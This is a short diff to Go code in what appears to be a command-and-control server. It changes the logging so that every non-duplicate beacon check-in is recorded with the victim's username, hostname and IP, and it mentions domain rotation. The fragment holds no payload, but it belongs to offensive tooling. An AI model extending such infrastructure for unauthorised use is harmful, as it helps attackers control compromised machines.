@@ -1030,8 +1030,8 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		}(beaconCopy)
 	}
 
-	// Only log checkins in debug mode and skip duplicates
-	if c2.debug && !isDuplicate {
+	// Log all checkins (not just debug mode) to track domain rotation
+	if !isDuplicate {
 		logf("[C2] Checkin: %s (%s@%s) from %s",
 			beaconID, username, hostname, clientIP)
 	}
